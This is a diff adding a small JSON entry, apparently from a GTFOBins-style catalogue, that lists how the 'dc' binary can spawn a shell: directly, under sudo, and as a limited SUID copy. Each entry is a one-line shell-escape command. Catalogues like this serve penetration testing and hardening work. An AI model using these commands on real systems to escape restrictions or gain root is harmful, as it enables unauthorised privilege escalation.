@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "dc -e '!/bin/sh'\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo dc -e '!/bin/sh'\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        
+        "code": "./dc -e '!/bin/sh'\n"
+      }
+    ]
+  }
+}
